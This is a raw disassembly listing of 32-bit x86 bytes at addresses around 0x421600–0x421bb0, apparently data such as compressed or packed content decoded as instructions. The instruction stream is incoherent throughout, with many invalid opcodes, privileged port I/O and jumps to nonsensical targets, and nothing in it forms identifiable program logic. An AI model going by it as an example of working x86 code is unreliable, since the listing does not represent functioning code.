  42161b:	9a 76 27 e5 a4 b4 a2 	lcall  $0xa2b4,$0xa4e52776
  421622:	90                   	nop
  421623:	aa                   	stos   %al,%es:(%edi)
  421624:	2e 18 b3 74 20 ef c9 	sbb    %dh,%cs:-0x3610df8c(%ebx)
  42162b:	a0 67 cd 23 ac       	mov    0xac23cd67,%al
  421630:	d3 37                	shll   %cl,(%edi)
  421632:	bb c4 48 43 72       	mov    $0x724348c4,%ebx
  421637:	69 06 9d 38 99 74    	imul   $0x7499389d,(%esi),%eax
  42163d:	00 6c 3c 15          	add    %ch,0x15(%esp,%edi,1)
  421641:	b8 89 c7 6c 34       	mov    $0x346cc789,%eax
  421646:	ce                   	into
  421647:	9b                   	fwait
  421648:	89 c9                	mov    %ecx,%ecx
  42164a:	b9 28 7d 29 5b       	mov    $0x5b297d28,%ecx
  42164f:	eb 32                	jmp    0x421683
  421651:	19 6a a2             	sbb    %ebp,-0x5e(%edx)
  421654:	2e e9 46 cb f6 ff    	cs jmp 0x38e1a0
  42165a:	46                   	inc    %esi
  42165b:	23 fb                	and    %ebx,%edi
  42165d:	70 34                	jo     0x421693
  42165f:	f0 78 ca             	lock js 0x42162c
  421662:	e9 8d ed 1c 92       	jmp    0x925f03f4
  421667:	22 20                	and    (%eax),%ah
  421669:	dd 4d d8             	fisttpll -0x28(%ebp)
  42166c:	c6                   	(bad)
  42166d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42166e:	9d                   	popf
  42166f:	aa                   	stos   %al,%es:(%edi)
  421670:	5c                   	pop    %esp
  421671:	2e d3 8a ca b8 88 4e 	rorl   %cl,%cs:0x4e88b8ca(%edx)
  421678:	b5 43                	mov    $0x43,%ch
  42167a:	fd                   	std
  42167b:	65 13 46 9a          	adc    %gs:-0x66(%esi),%eax
  42167f:	1c a6                	sbb    $0xa6,%al
  421681:	34 4f                	xor    $0x4f,%al
  421683:	08 34 2f             	or     %dh,(%edi,%ebp,1)
  421686:	6c                   	insb   (%dx),%es:(%edi)
  421687:	ba 47 48 e8 ad       	mov    $0xade84847,%edx
  42168c:	3e 99                	ds cltd
  42168e:	08 e3                	or     %ah,%bl
  421690:	5d                   	pop    %ebp
  421691:	05 4e cc 1e b4       	add    $0xb41ecc4e,%eax
  421696:	90                   	nop
  421697:	72 74                	jb     0x42170d
  421699:	8f                   	(bad)
  42169a:	ee                   	out    %al,(%dx)
  42169b:	62 d3 e9             	(bad) {%k6}
  42169e:	46                   	inc    %esi
  42169f:	af                   	scas   %es:(%edi),%eax
  4216a0:	d0 08                	rorb   $1,(%eax)
  4216a2:	d2 0f                	rorb   %cl,(%edi)
  4216a4:	6c                   	insb   (%dx),%es:(%edi)
  4216a5:	19 31                	sbb    %esi,(%ecx)
  4216a7:	46                   	inc    %esi
  4216a8:	25 f4 44 a7 97       	and    $0x97a744f4,%eax
  4216ad:	59                   	pop    %ecx
  4216ae:	58                   	pop    %eax
  4216af:	bc fc ae 01 0c       	mov    $0xc01aefc,%esp
  4216b4:	1f                   	pop    %ds
  4216b5:	e9 12 75 2e cb       	jmp    0xcb708bcc
  4216ba:	b0 8e                	mov    $0x8e,%al
  4216bc:	e6 0f                	out    %al,$0xf
  4216be:	37                   	aaa
  4216bf:	9d                   	popf
  4216c0:	b0 4a                	mov    $0x4a,%al
  4216c2:	cd 95                	int    $0x95
  4216c4:	32 a8 4a 2f 51 fa    	xor    -0x5aed0b6(%eax),%ch
  4216ca:	7c 1d                	jl     0x4216e9
  4216cc:	7b 5b                	jnp    0x421729
  4216ce:	30 eb                	xor    %ch,%bl
  4216d0:	e8 a1 a0 4a c7       	call   0xc78cb776
  4216d5:	27                   	daa
  4216d6:	4b                   	dec    %ebx
  4216d7:	60                   	pusha
  4216d8:	af                   	scas   %es:(%edi),%eax
  4216d9:	10 58 d4             	adc    %bl,-0x2c(%eax)
  4216dc:	2c 0e                	sub    $0xe,%al
  4216de:	2f                   	das
  4216df:	0a e7                	or     %bh,%ah
  4216e1:	82 c8 0e             	or     $0xe,%al
  4216e4:	32 d5                	xor    %ch,%dl
  4216e6:	57                   	push   %edi
  4216e7:	1a 56 d0             	sbb    -0x30(%esi),%dl
  4216ea:	4d                   	dec    %ebp
  4216eb:	2b 16                	sub    (%esi),%edx
  4216ed:	ab                   	stos   %eax,%es:(%edi)
  4216ee:	dd c7                	ffree  %st(7)
  4216f0:	21 d2                	and    %edx,%edx
  4216f2:	f3 1c aa             	repz sbb $0xaa,%al
  4216f5:	98                   	cwtl
  4216f6:	ff f6                	push   %esi
  4216f8:	f6 f5                	div    %ch
  4216fa:	7d ae                	jge    0x4216aa
  4216fc:	e6 15                	out    %al,$0x15
  4216fe:	86 66 81             	xchg   %ah,-0x7f(%esi)
  421701:	92                   	xchg   %eax,%edx
  421702:	2d 3e 56 5a fb       	sub    $0xfb5a563e,%eax
  421707:	7f a4                	jg     0x4216ad
  421709:	e4 1e                	in     $0x1e,%al
  42170b:	e6 a6                	out    %al,$0xa6
  42170d:	4a                   	dec    %edx
  42170e:	08 03                	or     %al,(%ebx)
  421710:	86 3c 32             	xchg   %bh,(%edx,%esi,1)
  421713:	54                   	push   %esp
  421714:	fe                   	(bad)
  421715:	28 50 44             	sub    %dl,0x44(%eax)
  421718:	44                   	inc    %esp
  421719:	9e                   	sahf
  42171a:	04 85                	add    $0x85,%al
  42171c:	e0 80                	loopne 0x42169e
  42171e:	57                   	push   %edi
  42171f:	95                   	xchg   %eax,%ebp
  421720:	c8 54 49 1e          	enter  $0x4954,$0x1e
  421724:	02 2e                	add    (%esi),%ch
  421726:	34 14                	xor    $0x14,%al
  421728:	f4                   	hlt
  421729:	05 6d 12 96 3a       	add    $0x3a96126d,%eax
  42172e:	bf da 7f 37 aa       	mov    $0xaa377fda,%edi
  421733:	0e                   	push   %cs
  421734:	a1 9c 93 fb 46       	mov    0x46fb939c,%eax
  421739:	38 41 48             	cmp    %al,0x48(%ecx)
  42173c:	7d 55                	jge    0x421793
  42173e:	bb 9f 21 00 ca       	mov    $0xca00219f,%ebx
  421743:	23 eb                	and    %ebx,%ebp
  421745:	6e                   	outsb  %ds:(%esi),(%dx)
  421746:	4e                   	dec    %esi
  421747:	d4 ba                	aam    $0xba
  421749:	c1 5d 3d 33          	rcrl   $0x33,0x3d(%ebp)
  42174d:	a9 87 a5 7f aa       	test   $0xaa7fa587,%eax
  421752:	6a be                	push   $0xffffffbe
  421754:	8d 3b                	lea    (%ebx),%edi
  421756:	f3 52                	repz push %edx
  421758:	52                   	push   %edx
  421759:	fa                   	cli
  42175a:	55                   	push   %ebp
  42175b:	57                   	push   %edi
  42175c:	2c e1                	sub    $0xe1,%al
  42175e:	34 fa                	xor    $0xfa,%al
  421760:	4d                   	dec    %ebp
  421761:	3a f2                	cmp    %dl,%dh
  421763:	da bf 48 eb 0c c6    	fidivrl -0x39f314b8(%edi)
  421769:	2f                   	das
  42176a:	fd                   	std
  42176b:	97                   	xchg   %eax,%edi
  42176c:	06                   	push   %es
  42176d:	34 a7                	xor    $0xa7,%al
  42176f:	ab                   	stos   %eax,%es:(%edi)
  421770:	fa                   	cli
  421771:	4e                   	dec    %esi
  421772:	f5                   	cmc
  421773:	a8 23                	test   $0x23,%al
  421775:	cb                   	lret
  421776:	2f                   	das
  421777:	b6 0c                	mov    $0xc,%dh
  421779:	8d 23                	lea    (%ebx),%esp
  42177b:	64 9b                	fs fwait
  42177d:	c4 44 69 41          	les    0x41(%ecx,%ebp,2),%eax
  421781:	5f                   	pop    %edi
  421782:	46                   	inc    %esi
  421783:	c3                   	ret
  421784:	dd 08                	fisttpll (%eax)
  421786:	29 80 6b d2 ed 82    	sub    %eax,-0x7d122d95(%eax)
  42178c:	16                   	push   %ss
  42178d:	26 de ed             	es fsubrp %st,%st(5)
  421790:	6a da                	push   $0xffffffda
  421792:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  421793:	2f                   	das
  421794:	6c                   	insb   (%dx),%es:(%edi)
  421795:	31 3e                	xor    %edi,(%esi)
  421797:	4c                   	dec    %esp
  421798:	84 bf 46 df bf 54    	test   %bh,0x54bfdf46(%edi)
  42179e:	ef                   	out    %eax,(%dx)
  42179f:	50                   	push   %eax
  4217a0:	b4 be                	mov    $0xbe,%ah
  4217a2:	cb                   	lret
  4217a3:	c8 a1 9e 38          	enter  $0x9ea1,$0x38
  4217a7:	ca 37 d8             	lret   $0xd837
  4217aa:	a2 85 0c b4 3f       	mov    %al,0x3fb40c85
  4217af:	b1 38                	mov    $0x38,%cl
  4217b1:	02 f0                	add    %al,%dh
  4217b3:	36 1f                	ss pop %ds
  4217b5:	0c a5                	or     $0xa5,%al
  4217b7:	77 7d                	ja     0x421836
  4217b9:	40                   	inc    %eax
  4217ba:	63 be 6d db ef b6    	arpl   %edi,-0x49102493(%esi)
  4217c0:	e2 40                	loop   0x421802
  4217c2:	ee                   	out    %al,(%dx)
  4217c3:	3c 73                	cmp    $0x73,%al
  4217c5:	ad                   	lods   %ds:(%esi),%eax
  4217c6:	f0 9b                	lock fwait
  4217c8:	4f                   	dec    %edi
  4217c9:	eb 6f                	jmp    0x42183a
  4217cb:	31 77 c7             	xor    %esi,-0x39(%edi)
  4217ce:	39 7d 43             	cmp    %edi,0x43(%ebp)
  4217d1:	98                   	cwtl
  4217d2:	7e 66                	jle    0x42183a
  4217d4:	ef                   	out    %eax,(%dx)
  4217d5:	74 fb                	je     0x4217d2
  4217d7:	d9 06                	flds   (%esi)
  4217d9:	7b 2e                	jnp    0x421809
  4217db:	22 e2                	and    %dl,%ah
  4217dd:	c8 96 ae 56          	enter  $0xae96,$0x56
  4217e1:	1d ec fe b3 36       	sbb    $0x36b3feec,%eax
  4217e6:	3b 8f 28 4a e6 f0    	cmp    -0xf19b5d8(%edi),%ecx
  4217ec:	42                   	inc    %edx
  4217ed:	80 5c 8e 1b e4       	sbbb   $0xe4,0x1b(%esi,%ecx,4)
  4217f2:	09 4d fb             	or     %ecx,-0x5(%ebp)
  4217f5:	1d 02 f4 e1 31       	sbb    $0x31e1f402,%eax
  4217fa:	e9 18 4e 61 b6       	jmp    0xb6a36617
  4217ff:	da 7c a0 35          	fidivrl 0x35(%eax,%eiz,4)
  421803:	5d                   	pop    %ebp
  421804:	ae                   	scas   %es:(%edi),%al
  421805:	75 eb                	jne    0x4217f2
  421807:	e0 09                	loopne 0x421812
  421809:	0c ba                	or     $0xba,%al
  42180b:	0a 11                	or     (%ecx),%dl
  42180d:	2a 4f ed             	sub    -0x13(%edi),%cl
  421810:	77 b4                	ja     0x4217c6
  421812:	14 c8                	adc    $0xc8,%al
  421814:	b0 80                	mov    $0x80,%al
  421816:	ba f8 5c a4 f9       	mov    $0xf9a45cf8,%edx
  42181b:	31 90 cf 37 a0 30    	xor    %edx,0x30a037cf(%eax)
  421821:	00 05 fd 2e f8 28    	add    %al,0x28f82efd
  421827:	32 90 ec 05 91 82    	xor    -0x7d6efa14(%eax),%dl
  42182d:	d1 bb e0 ca 3e a7    	sarl   $1,-0x58c13520(%ebx)
  421833:	c6                   	(bad)
  421834:	bb bd ce a1 ee       	mov    $0xeea1cebd,%ebx
  421839:	49                   	dec    %ecx
  42183a:	d8 7d 07             	fdivrs 0x7(%ebp)
  42183d:	3b 9e 62 5a e3 c6    	cmp    -0x391ca59e(%esi),%ebx
  421843:	ee                   	out    %al,(%dx)
  421844:	c8 37 59 89          	enter  $0x5937,$0x89
  421848:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  421849:	cb                   	lret
  42184a:	3d 11 3d 9d 06       	cmp    $0x69d3d11,%eax
  42184f:	9a 6b 36 12 71 24 59 	lcall  $0x5924,$0x7112366b
  421856:	d0 41 44             	rolb   $1,0x44(%ecx)
  421859:	56                   	push   %esi
  42185a:	fa                   	cli
  42185b:	45                   	inc    %ebp
  42185c:	da 37                	fidivl (%edi)
  42185e:	10 e9                	adc    %ch,%cl
  421860:	b5 65                	mov    $0x65,%ch
  421862:	d8 16                	fcoms  (%esi)
  421864:	e1 8d                	loope  0x4217f3
  421866:	45                   	inc    %ebp
  421867:	32 4d d7             	xor    -0x29(%ebp),%cl
  42186a:	c4 38                	les    (%eax),%edi
  42186c:	67 a5                	movsl  %ds:(%si),%es:(%di)
  42186e:	bc 01 a8 dd e1       	mov    $0xe1dda801,%esp
  421873:	af                   	scas   %es:(%edi),%eax
  421874:	3a bc e3 30 8e 25 65 	cmp    0x65258e30(%ebx,%eiz,8),%bh
  42187b:	cd cd                	int    $0xcd
  42187d:	eb f8                	jmp    0x421877
  42187f:	e5 c5                	in     $0xc5,%eax
  421881:	30 b6 4a ab 2b 8b    	xor    %dh,-0x74d454b6(%esi)
  421887:	2d a4 98 79 51       	sub    $0x517998a4,%eax
  42188c:	85 ec                	test   %ebp,%esp
  42188e:	0b d0                	or     %eax,%edx
  421890:	d6                   	salc
  421891:	e7 65                	out    %eax,$0x65
  421893:	e3 12                	jecxz  0x4218a7
  421895:	1e                   	push   %ds
  421896:	89 ed                	mov    %ebp,%ebp
  421898:	94                   	xchg   %eax,%esp
  421899:	a1 27 00 09 4a       	mov    0x4a090027,%eax
  42189e:	e7 5d                	out    %eax,$0x5d
  4218a0:	5b                   	pop    %ebx
  4218a1:	fc                   	cld
  4218a2:	a9 58 76 0d 7e       	test   $0x7e0d7658,%eax
  4218a7:	67 b7 99             	addr16 mov $0x99,%bh
  4218aa:	b1 98                	mov    $0x98,%cl
  4218ac:	53                   	push   %ebx
  4218ad:	24 35                	and    $0x35,%al
  4218af:	d6                   	salc
  4218b0:	44                   	inc    %esp
  4218b1:	90                   	nop
  4218b2:	f2 3d ef c4 6b cf    	repnz cmp $0xcf6bc4ef,%eax
  4218b8:	dd 6e da             	(bad) -0x26(%esi)
  4218bb:	59                   	pop    %ecx
  4218bc:	a8 02                	test   $0x2,%al
  4218be:	f6 82 6c 86 d8 b5 a4 	testb  $0xa4,-0x4a277994(%edx)
  4218c5:	e5 0b                	in     $0xb,%eax
  4218c7:	65 b5 66             	gs mov $0x66,%ch
  4218ca:	46                   	inc    %esi
  4218cb:	ef                   	out    %eax,(%dx)
  4218cc:	13 2c 1d a5 20 fe 69 	adc    0x69fe20a5(,%ebx,1),%ebp
  4218d3:	48                   	dec    %eax
  4218d4:	41                   	inc    %ecx
  4218d5:	e3 9b                	jecxz  0x421872
  4218d7:	6d                   	insl   (%dx),%es:(%edi)
  4218d8:	0c 41                	or     $0x41,%al
  4218da:	07                   	pop    %es
  4218db:	71 1c                	jno    0x4218f9
  4218dd:	fe 08                	decb   (%eax)
  4218df:	bd 0a a1 b9 86       	mov    $0x86b9a10a,%ebp
  4218e4:	9d                   	popf
  4218e5:	e0 b2                	loopne 0x421899
  4218e7:	9d                   	popf
  4218e8:	29 15 b2 6f 6b 0e    	sub    %edx,0xe6b6fb2
  4218ee:	82 76 7a 4c          	xorb   $0x4c,0x7a(%esi)
  4218f2:	31 fd                	xor    %edi,%ebp
  4218f4:	a0 a4 f0 e2 68       	mov    0x68e2f0a4,%al
  4218f9:	66 c7                	data16 (bad)
  4218fb:	f5                   	cmc
  4218fc:	43                   	inc    %ebx
  4218fd:	e4 02                	in     $0x2,%al
  4218ff:	cf                   	iret
  421900:	01 ec                	add    %ebp,%esp
  421902:	e1 e8                	loope  0x4218ec
  421904:	0c 0d                	or     $0xd,%al
  421906:	eb 40                	jmp    0x421948
  421908:	8c 49 22             	mov    %cs,0x22(%ecx)
  42190b:	61                   	popa
  42190c:	52                   	push   %edx
  42190d:	c7                   	(bad)
  42190e:	6f                   	outsl  %ds:(%esi),(%dx)
  42190f:	10 8e e1 2d ec 3a    	adc    %cl,0x3aec2de1(%esi)
  421915:	20 33                	and    %dh,(%ebx)
  421917:	dd ea                	fucomp %st(2)
  421919:	d0 b7 af 5b a3 36    	shlb   $1,0x36a35baf(%edi)
  42191f:	e6 c0                	out    %al,$0xc0
  421921:	cf                   	iret
  421922:	fa                   	cli
  421923:	8c d6                	mov    %ss,%esi
  421925:	a3 03 18 9e bf       	mov    %eax,0xbf9e1803
  42192a:	7f 4d                	jg     0x421979
  42192c:	32 50 37             	xor    0x37(%eax),%dl
  42192f:	22 78 e3             	and    -0x1d(%eax),%bh
  421932:	41                   	inc    %ecx
  421933:	06                   	push   %es
  421934:	f6 be 62 21 af dc    	idivb  -0x2350de9e(%esi)
  42193a:	94                   	xchg   %eax,%esp
  42193b:	d6                   	salc
  42193c:	ce                   	into
  42193d:	6c                   	insb   (%dx),%es:(%edi)
  42193e:	35 6f a1 b8 90       	xor    $0x90b8a16f,%eax
  421943:	f9                   	stc
  421944:	6e                   	outsb  %ds:(%esi),(%dx)
  421945:	d4 0b                	aam    $0xb
  421947:	d6                   	salc
  421948:	39 55 ec             	cmp    %edx,-0x14(%ebp)
  42194b:	e5 66                	in     $0x66,%eax
  42194d:	97                   	xchg   %eax,%edi
  42194e:	24 86                	and    $0x86,%al
  421950:	39 f3                	cmp    %esi,%ebx
  421952:	89 4f 7a             	mov    %ecx,0x7a(%edi)
  421955:	61                   	popa
  421956:	c3                   	ret
  421957:	26 5d                	es pop %ebp
  421959:	ad                   	lods   %ds:(%esi),%eax
  42195a:	b5 32                	mov    $0x32,%ch
  42195c:	8e 6a a6             	mov    -0x5a(%edx),%gs
  42195f:	e9 b0 8e a8 ca       	jmp    0xcaeaa814
  421964:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  421965:	c4 8e 0e 40 4a 9c    	les    -0x63b5bff2(%esi),%ecx
  42196b:	3d 16 7e 5d dd       	cmp    $0xdd5d7e16,%eax
  421970:	78 3a                	js     0x4219ac
  421972:	20 a5 39 82 3d a7    	and    %ah,-0x58c27dc7(%ebp)
  421978:	cd 2c                	int    $0x2c
  42197a:	de 1c c2             	ficomps (%edx,%eax,8)
  42197d:	99                   	cltd
  42197e:	57                   	push   %edi
  42197f:	7a 7c                	jp     0x4219fd
  421981:	cf                   	iret
  421982:	ca 8e 4a             	lret   $0x4a8e
  421985:	e2 39                	loop   0x4219c0
  421987:	96                   	xchg   %eax,%esi
  421988:	b5 2f                	mov    $0x2f,%ch
  42198a:	69 d9 1b 12 82 66    	imul   $0x6682121b,%ecx,%ebx
  421990:	34 82                	xor    $0x82,%al
  421992:	50                   	push   %eax
  421993:	07                   	pop    %es
  421994:	7a ed                	jp     0x421983
  421996:	f3 ca 6f a1          	repz lret $0xa16f
  42199a:	e5 4b                	in     $0x4b,%eax
  42199c:	5e                   	pop    %esi
  42199d:	56                   	push   %esi
  42199e:	17                   	pop    %ss
  42199f:	ba 41 3a d9 34       	mov    $0x34d93a41,%edx
  4219a4:	43                   	inc    %ebx
  4219a5:	5f                   	pop    %edi
  4219a6:	2b 76 00             	sub    0x0(%esi),%esi
  4219a9:	5b                   	pop    %ebx
  4219aa:	ae                   	scas   %es:(%edi),%al
  4219ab:	85 a5 cc 1e 4c 18    	test   %esp,0x184c1ecc(%ebp)
  4219b1:	3e 8e 12             	mov    %ds:(%edx),%ss
  4219b4:	60                   	pusha
  4219b5:	23 0e                	and    (%esi),%ecx
  4219b7:	82 47 fa d6          	addb   $0xd6,-0x6(%edi)
  4219bb:	58                   	pop    %eax
  4219bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4219bd:	c5 c7 6a             	(bad)
  4219c0:	a0 20 48 e9 62       	mov    0x62e94820,%al
  4219c5:	f4                   	hlt
  4219c6:	5a                   	pop    %edx
  4219c7:	c0 74 6f 81 9c       	shlb   $0x9c,-0x7f(%edi,%ebp,2)
  4219cc:	37                   	aaa
  4219cd:	04 84                	add    $0x84,%al
  4219cf:	36 1e                	ss push %ds
  4219d1:	11 55 62             	adc    %edx,0x62(%ebp)
  4219d4:	11 7f 61             	adc    %edi,0x61(%edi)
  4219d7:	c6                   	(bad)
  4219d8:	0f 43 09             	cmovae (%ecx),%ecx
  4219db:	e0 bf                	loopne 0x42199c
  4219dd:	db e3                	fninit
  4219df:	fc                   	cld
  4219e0:	7d e7                	jge    0x4219c9
  4219e2:	ff 92 63 56 cf cd    	call   *-0x3230a99d(%edx)
  4219e8:	44                   	inc    %esp
  4219e9:	36 40                	ss inc %eax
  4219eb:	07                   	pop    %es
  4219ec:	57                   	push   %edi
  4219ed:	b3 0f                	mov    $0xf,%bl
  4219ef:	1f                   	pop    %ds
  4219f0:	39 53 75             	cmp    %edx,0x75(%ebx)
  4219f3:	c7                   	(bad)
  4219f4:	8b b9 93 4d 25 e3    	mov    -0x1cdab26d(%ecx),%edi
  4219fa:	a2 aa 49 b7 06       	mov    %al,0x6b749aa
  4219ff:	94                   	xchg   %eax,%esp
  421a00:	e4 5b                	in     $0x5b,%al
  421a02:	79 79                	jns    0x421a7d
  421a04:	21 85 90 f2 a4 2e    	and    %eax,0x2ea4f290(%ebp)
  421a0a:	43                   	inc    %ebx
  421a0b:	38 de                	cmp    %bl,%dh
  421a0d:	07                   	pop    %es
  421a0e:	93                   	xchg   %eax,%ebx
  421a0f:	d2 cb                	ror    %cl,%bl
  421a11:	30 60 4a             	xor    %ah,0x4a(%eax)
  421a14:	39 fc                	cmp    %edi,%esp
  421a16:	eb 00                	jmp    0x421a18
  421a18:	ac                   	lods   %ds:(%esi),%al
  421a19:	c2 00 4a             	ret    $0x4a00
  421a1c:	bf b7 35 6d b1       	mov    $0xb16d35b7,%edi
  421a21:	8f 04 64             	pop    (%esp,%eiz,2)
  421a24:	f7 fc                	idiv   %esp
  421a26:	c0 5c 1c 97 4f       	rcrb   $0x4f,-0x69(%esp,%ebx,1)
  421a2b:	92                   	xchg   %eax,%edx
  421a2c:	9a 7f ab 59 27 67 6f 	lcall  $0x6f67,$0x2759ab7f
  421a33:	5c                   	pop    %esp
  421a34:	c9                   	leave
  421a35:	b8 ce 58 df 8b       	mov    $0x8bdf58ce,%eax
  421a3a:	c8 c8 a0 da          	enter  $0xa0c8,$0xda
  421a3e:	d2 c3                	rol    %cl,%bl
  421a40:	e7 49                	out    %eax,$0x49
  421a42:	4d                   	dec    %ebp
  421a43:	ce                   	into
  421a44:	36 a9 34 54 c4 5c    	ss test $0x5cc45434,%eax
  421a4a:	94                   	xchg   %eax,%esp
  421a4b:	7e b0                	jle    0x4219fd
  421a4d:	b7 1b                	mov    $0x1b,%bh
  421a4f:	61                   	popa
  421a50:	03 ef                	add    %edi,%ebp
  421a52:	53                   	push   %ebx
  421a53:	0c 71                	or     $0x71,%al
  421a55:	5d                   	pop    %ebp
  421a56:	5f                   	pop    %edi
  421a57:	07                   	pop    %es
  421a58:	6a ed                	push   $0xffffffed
  421a5a:	da ed                	(bad)
  421a5c:	78 f9                	js     0x421a57
  421a5e:	36 ab                	ss stos %eax,%es:(%edi)
  421a60:	4f                   	dec    %edi
  421a61:	9c                   	pushf
  421a62:	97                   	xchg   %eax,%edi
  421a63:	91                   	xchg   %eax,%ecx
  421a64:	21 96 5f 2c ee bb    	and    %edx,-0x4411d3a1(%esi)
  421a6a:	6b 22 89             	imul   $0xffffff89,(%edx),%esp
  421a6d:	a0 b7 0b fb 0e       	mov    0xefb0bb7,%al
  421a72:	bd 18 1f be 05       	mov    $0x5be1f18,%ebp
  421a77:	9c                   	pushf
  421a78:	53                   	push   %ebx
  421a79:	17                   	pop    %ss
  421a7a:	97                   	xchg   %eax,%edi
  421a7b:	97                   	xchg   %eax,%edi
  421a7c:	cd 6d                	int    $0x6d
  421a7e:	3f                   	aas
  421a7f:	31 35 39 97 56 3e    	xor    %esi,0x3e569739
  421a85:	b7 6a                	mov    $0x6a,%bh
  421a87:	dd 27                	frstor (%edi)
  421a89:	e8 bc 7a d4 e5       	call   0xe616954a
  421a8e:	dd 3a                	fnstsw (%edx)
  421a90:	64 e3 4e             	fs jecxz 0x421ae1
  421a93:	1b 5a d7             	sbb    -0x29(%edx),%ebx
  421a96:	fe 01                	incb   (%ecx)
  421a98:	08 fd                	or     %bh,%ch
  421a9a:	37                   	aaa
  421a9b:	40                   	inc    %eax
  421a9c:	eb bb                	jmp    0x421a59
  421a9e:	ce                   	into
  421a9f:	32 56 30             	xor    0x30(%esi),%dl
  421aa2:	38 dc                	cmp    %bl,%ah
  421aa4:	4f                   	dec    %edi
  421aa5:	76 02                	jbe    0x421aa9
  421aa7:	d9 93 e2 61 77 24    	fsts   0x247761e2(%ebx)
  421aad:	8c db                	mov    %ds,%ebx
  421aaf:	92                   	xchg   %eax,%edx
  421ab0:	da 22                	fisubl (%edx)
  421ab2:	65 7c bd             	gs jl  0x421a72
  421ab5:	6a d7                	push   $0xffffffd7
  421ab7:	3a 3c 0b             	cmp    (%ebx,%ecx,1),%bh
  421aba:	1e                   	push   %ds
  421abb:	68 92 34 ae 88       	push   $0x88ae3492
  421ac0:	21 ed                	and    %ebp,%ebp
  421ac2:	ef                   	out    %eax,(%dx)
  421ac3:	a1 1c b6 fe bc       	mov    0xbcfeb61c,%eax
  421ac8:	72 da                	jb     0x421aa4
  421aca:	c8 a1 da b5          	enter  $0xdaa1,$0xb5
  421ace:	d0 a7 69 4b a1 b1    	shlb   $1,-0x4e5eb497(%edi)
  421ad4:	0f 4f 78 72          	cmovg  0x72(%eax),%edi
  421ad8:	62 66 95             	bound  %esp,-0x6b(%esi)
  421adb:	6f                   	outsl  %ds:(%esi),(%dx)
  421adc:	3e dc 09             	fmull  %ds:(%ecx)
  421adf:	b5 b8                	mov    $0xb8,%ch
  421ae1:	d3 36                	shll   %cl,(%esi)
  421ae3:	ec                   	in     (%dx),%al
  421ae4:	6b 86 53 67 57 e3 81 	imul   $0xffffff81,-0x1ca898ad(%esi),%eax
  421aeb:	fa                   	cli
  421aec:	0b 86 f5 5d 9a 96    	or     -0x6965a20b(%esi),%eax
  421af2:	1a c2                	sbb    %dl,%al
  421af4:	a8 7a                	test   $0x7a,%al
  421af6:	2e 18 ac 14 6d 83 a3 	sbb    %ch,%cs:-0x185c7c93(%esp,%edx,1)
  421afd:	e7 
  421afe:	22 fc                	and    %ah,%bh
  421b00:	48                   	dec    %eax
  421b01:	29 df                	sub    %ebx,%edi
  421b03:	33 a6 0b c3 c6 66    	xor    0x66c6c30b(%esi),%esp
  421b09:	56                   	push   %esi
  421b0a:	63 37                	arpl   %esi,(%edi)
  421b0c:	8f c4                	pop    %esp
  421b0e:	0d dd 09 9c 28       	or     $0x289c09dd,%eax
  421b13:	29 55 f6             	sub    %edx,-0xa(%ebp)
  421b16:	5b                   	pop    %ebx
  421b17:	b2 f3                	mov    $0xf3,%dl
  421b19:	68 5a 84 93 e5       	push   $0xe593845a
  421b1e:	56                   	push   %esi
  421b1f:	75 41                	jne    0x421b62
  421b21:	a9 68 d9 33 28       	test   $0x2833d968,%eax
  421b26:	df 46 35             	filds  0x35(%esi)
  421b29:	d3 dc                	rcr    %cl,%esp
  421b2b:	ef                   	out    %eax,(%dx)
  421b2c:	ee                   	out    %al,(%dx)
  421b2d:	9b                   	fwait
  421b2e:	b7 29                	mov    $0x29,%bh
  421b30:	e9 93 53 f7 ff       	jmp    0x396ec8
  421b35:	c0 62 d6 fe          	shlb   $0xfe,-0x2a(%edx)
  421b39:	1b b8 02 47 be b3    	sbb    -0x4c41b8fe(%eax),%edi
  421b3f:	fc                   	cld
  421b40:	71 4f                	jno    0x421b91
  421b42:	2e f5                	cs cmc
  421b44:	80 e2 09             	and    $0x9,%dl
  421b47:	df a3 ab 7d 32 16    	fbld   0x16327dab(%ebx)
  421b4d:	d7                   	xlat   %ds:(%ebx)
  421b4e:	85 6a ac             	test   %ebp,-0x54(%edx)
  421b51:	ee                   	out    %al,(%dx)
  421b52:	c0 e5 8a             	shl    $0x8a,%ch
  421b55:	04 6f                	add    $0x6f,%al
  421b57:	13 f4                	adc    %esp,%esi
  421b59:	52                   	push   %edx
  421b5a:	4b                   	dec    %ebx
  421b5b:	47                   	inc    %edi
  421b5c:	e1 b6                	loope  0x421b14
  421b5e:	5e                   	pop    %esi
  421b5f:	a1 d0 00 ff 7c       	mov    0x7cff00d0,%eax
  421b64:	b7 79                	mov    $0x79,%bh
  421b66:	da 47 97             	fiaddl -0x69(%edi)
  421b69:	02 c9                	add    %cl,%cl
  421b6b:	03 14 44             	add    (%esp,%eax,2),%edx
  421b6e:	3e cc                	ds int3
  421b70:	f1                   	int1
  421b71:	61                   	popa
  421b72:	21 4a a5             	and    %ecx,-0x5b(%edx)
  421b75:	4c                   	dec    %esp
  421b76:	9c                   	pushf
  421b77:	ec                   	in     (%dx),%al
  421b78:	9c                   	pushf
  421b79:	59                   	pop    %ecx
  421b7a:	86 61 df             	xchg   %ah,-0x21(%ecx)
  421b7d:	6e                   	outsb  %ds:(%esi),(%dx)
  421b7e:	24 ea                	and    $0xea,%al
  421b80:	d3 1c ac             	rcrl   %cl,(%esp,%ebp,4)
  421b83:	9b                   	fwait
  421b84:	f3 c1 1b b9          	repz rcrl $0xb9,(%ebx)
  421b88:	6d                   	insl   (%dx),%es:(%edi)
  421b89:	59                   	pop    %ecx
  421b8a:	cd 77                	int    $0x77
  421b8c:	25 92 1e 33 f1       	and    $0xf1331e92,%eax
  421b91:	7a fd                	jp     0x421b90
  421b93:	ad                   	lods   %ds:(%esi),%eax
  421b94:	2a 15 7e 00 4e ed    	sub    0xed4e007e,%dl
  421b9a:	25 be 8f 06 91       	and    $0x91068fbe,%eax
  421b9f:	4a                   	dec    %edx
  421ba0:	23 7f a5             	and    -0x5b(%edi),%edi
  421ba3:	8b 3b                	mov    (%ebx),%edi
  421ba5:	1e                   	push   %ds
  421ba6:	d7                   	xlat   %ds:(%ebx)
  421ba7:	e4 b1                	in     $0xb1,%al
  421ba9:	32 2b                	xor    (%ebx),%ch
  421bab:	1c b3                	sbb    $0xb3,%al
  421bad:	f0 f7 87 23 e9 c3 dc 	lock testl $0x7b239a57,-0x233c16dd(%edi)
